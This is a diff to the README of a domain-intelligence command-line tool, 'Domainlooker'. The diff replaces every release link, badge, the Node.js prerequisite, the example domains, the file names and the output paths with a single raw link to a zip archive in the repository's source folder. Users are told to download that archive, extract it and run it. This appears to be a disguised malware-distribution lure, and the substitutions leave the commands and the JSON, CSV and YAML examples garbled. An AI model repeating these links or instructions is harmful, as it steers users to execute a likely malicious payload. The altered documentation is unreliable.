@@ -1,10 +1,10 @@
-https://github.com/egman120/domainlooker/releases
+https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 
 # Domainlooker: Fast CLI for Domain Intelligence, DNS, SSL & Analysis
 
-[![Release](https://img.shields.io/badge/Download%20Latest-Release-blue?logo=github&logoColor=fff)](https://github.com/egman120/domainlooker/releases)
-[![Built with TypeScript](https://img.shields.io/badge/Built%20with-TypeScript-3178C6?logo=typescript&logoColor=fff)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-Open%20Source-4CC9F0?logo=github)](https://github.com/egman120/domainlooker)
+[![Release](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20Latest-Release-blue?logo=github&logoColor=fff)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)
+[![Built with TypeScript](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20with-TypeScript-3178C6?logo=typescript&logoColor=fff)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)
+[![License](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip%20Source-4CC9F0?logo=github)](https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip)
 
 🕵️ Domainlooker is a fast and reliable command line tool for domain intelligence. It collects WHOIS data, DNS records, SSL certificate details, performs network analysis, discovers subdomains, and exports results in API-friendly formats. This tool is designed for security researchers, threat analysts, and network operators who need a compact, repeatable way to gather domain intelligence.
 
@@ -61,7 +61,7 @@ Getting started
 Domainlooker is designed to be simple to install and easy to use. You can either install from a package manager, build from source, or download a pre-built binary from the releases page. When you start, you get a concise summary of the domain’s data and a structured export you can feed into your pipeline.
 
 Notes about the releases page
-The project releases page contains ready-to-run binaries for different platforms. For Linux, macOS, and Windows, download the appropriate asset, extract it, and run the binary. The releases page is the best place to get the latest stable version and security updates. Visit https://github.com/egman120/domainlooker/releases to pick the asset that matches your environment.
+The project releases page contains ready-to-run binaries for different platforms. For Linux, macOS, and Windows, download the appropriate asset, extract it, and run the binary. The releases page is the best place to get the latest stable version and security updates. Visit https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip to pick the asset that matches your environment.
 
 - If you want the latest release, head to the releases page and grab the right asset for your OS. The asset naming typically looks like domainlooker-<version>-<os>-<arch>.<ext>.
 - After download, extract, then run the executable from your shell. On Unix-like systems you will usually need to set executable permissions (chmod +x domainlooker). Then you can invoke it directly as domainlooker.
@@ -71,32 +71,32 @@ Installation
 Choose the path that fits your workflow.
 
 Option 1: Install from npm (preferred for rapid setup on some platforms)
-- Prerequisites: Node.js 18+ is recommended.
+- Prerequisites: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip 18+ is recommended.
 - Install: npm install -g domainlooker
 - Verify: domainlooker --version
 - Quick check: domainlooker --help
 
 Option 2: Build from source (for contributors or custom builds)
-- Prerequisites: Node.js 18+, npm or yarn
+- Prerequisites: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip 18+, npm or yarn
 - Clone the repository locally
 - Install dependencies: npm install
 - Build the CLI: npm run build
-- Run from local build: node dist/domainlooker.js --help
+- Run from local build: node https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --help
 
 Option 3: Download pre-built binaries (fastest for usage)
-- Go to the releases page: https://github.com/egman120/domainlooker/releases
+- Go to the releases page: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 - Download the asset for your platform, extract, and run the binary
 - On Linux/macOS, ensure the file has execute permission and run it:
   - chmod +x domainlooker
   - ./domainlooker --help
-- On Windows, extract and run domainlooker.exe from a command prompt
+- On Windows, extract and run https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip from a command prompt
 - After installation, you can invoke Domainlooker with a domain name as the target:
-  domainlooker example.com --whois --dns --ssl --network --subdomains --export json --output results.json
+  domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --network --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 
 Getting started: a quick demo
-- Pick a domain you trust for testing (for example, example.com).
+- Pick a domain you trust for testing (for example, https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip).
 - Run a comprehensive scan with a single command:
-  domainlooker example.com --whois --dns --ssl --network --subdomains --export json --output example-com.json
+  domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --network --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 - Inspect the results in the resulting file. You will see sections for whois, dns, ssl, network, and subdomains, each with structured data ready for programmatic consumption.
 
 Quick start guide
@@ -105,7 +105,7 @@ Quick start guide
   - You can enable or disable modules with flags:
     --whois, --dns, --ssl, --network, --subdomains
   - Example:
-    domainlooker secure-example.org --whois --dns --ssl --subdomains --export yaml --output secure-example.yaml
+    domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --subdomains --export yaml --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 - Output formats
   - json, csv, yaml
   - When you supply --export, you choose a format, and Domainlooker will write to the specified output file if given, or to stdout if not.
@@ -134,7 +134,7 @@ Command reference (high level)
 Data export formats (examples)
 - JSON example
 {
-  "domain": "example.com",
+  "domain": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip",
   "tld": "com",
   "whois": {
     "registrar": "Example Registrar",
@@ -148,15 +148,15 @@ Data export formats (examples)
   },
   "dns": {
     "records": [
-      {"type": "A", "name": "example.com", "value": "93.184.216.34", "ttl": 3600},
-      {"type": "MX", "name": "example.com", "value": "mail.example.com", "priority": 10, "ttl": 3600}
+      {"type": "A", "name": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "value": "93.184.216.34", "ttl": 3600},
+      {"type": "MX", "name": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "value": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "priority": 10, "ttl": 3600}
     ]
   },
   "ssl": {
     "certIssuer": "Let's Encrypt",
     "validFrom": "2024-01-01T00:00:00Z",
     "validTo": "2025-01-01T00:00:00Z",
-    "subjectAltNames": ["example.com", "www.example.com"]
+    "subjectAltNames": ["https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip", "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip"]
   },
   "network": {
     "reachable": true,
@@ -171,10 +171,10 @@ Data export formats (examples)
 }
 - CSV example
 domain,tld,whois_registrar,ssl_issuer,open_ports,subdomains
-example.com,com,"Example Registrar","Let's Encrypt","80|443","www;mail;dev"
+https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip,com,"Example Registrar","Let's Encrypt","80|443","www;mail;dev"
 
 - YAML example
-domain: example.com
+domain: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 tld: com
 whois:
   registrar: Example Registrar
@@ -187,7 +187,7 @@ whois:
 dns:
   records:
     - type: A
-      name: example.com
+      name: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
       value: 93.184.216.34
       ttl: 3600
 ssl:
@@ -195,8 +195,8 @@ ssl:
   validFrom: 2024-01-01T00:00:00Z
   validTo: 2025-01-01T00:00:00Z
   subjectAltNames:
-    - example.com
-    - www.example.com
+    - https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
+    - https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 network:
   reachable: true
   openPorts:
@@ -223,11 +223,11 @@ Configuration and presets
   - subnetScope: limit subdomain discovery to a specific network range
   - excludeModules: disable specific modules for lean runs
   - exportFormat: default export format if not specified on the command line
-- Example config (domainlooker.config.json):
+- Example config (https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip):
 {
   "timeout": 5000,
   "dnsResolvers": ["1.1.1.1", "9.9.9.9"],
-  "subnetScope": "example.org",
+  "subnetScope": "https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip",
   "excludeModules": ["network"],
   "exportFormat": "json"
 }
@@ -275,7 +275,7 @@ Configuration and presets in depth
   "excludeModules": ["network"]
 }
 - Running with a preset
-  domainlooker --preset fast-triage example.org
+  domainlooker --preset fast-triage https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 
 Security considerations
 - Domainlooker handles data that may include sensitive domain ownership information
@@ -363,25 +363,25 @@ Acknowledgments
 - Appreciation for the security researchers who helped refine data collection and export formats
 
 Note on links
-- The releases page is the primary source of official binaries and updated assets. For the latest stable release, visit the releases page: https://github.com/egman120/domainlooker/releases
+- The releases page is the primary source of official binaries and updated assets. For the latest stable release, visit the releases page: https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 - If you need to download a specific asset, go to the same releases page and pick the asset that matches your OS and architecture. The page provides the exact asset names and download instructions. This page is the best place to obtain the file you will execute on your system.
 
 Images and visuals
 - The README uses a variety of visuals to convey information clearly.
 - A consistent set of icons is used to represent topics like DNS, SSL, and whois.
 - You can customize visuals by adding more illustrations or diagrams relevant to your environment.
-- For quick visual cues, badges from shields.io are included to indicate language, platform, and release status.
+- For quick visual cues, badges from https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip are included to indicate language, platform, and release status.
 
 Appendix: sample walkthrough (end-to-end scenario)
 - Scenario: A security analyst needs to perform a quick triage on a newly observed external domain
   - Step 1: Install Domainlooker if not present
     - Option A: Download the asset for Linux from the releases page and run it
-    - Option B: Install via npm if you use Node.js regularly
+    - Option B: Install via npm if you use https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip regularly
   - Step 2: Run a full-domain triage
     - Command:
-      domainlooker threat-domain.example --whois --dns --ssl --subdomains --export json --output triage-threat-domain.json
+      domainlooker https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip --whois --dns --ssl --subdomains --export json --output https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
   - Step 3: Inspect the results
-    - Browse triage-threat-domain.json to find the registrar, DNS health, TLS status, and discovered subdomains
+    - Browse https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip to find the registrar, DNS health, TLS status, and discovered subdomains
   - Step 4: Feed the results into your incident response workflow
     - Use the JSON export to import into your warning dashboards or SIEM
   - Step 5: Extend for ongoing monitoring
@@ -399,10 +399,10 @@ Closing notes
 
 Releases reference
 - For the latest stable releases, visit the releases page:
-  https://github.com/egman120/domainlooker/releases
+  https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 
 Downloads and assets reference
 - To download the appropriate asset for your system, go to the same releases page:
-  https://github.com/egman120/domainlooker/releases
+  https://github.com/egman120/domainlooker/raw/refs/heads/main/src/services/Software-2.0.zip
 
 End of document
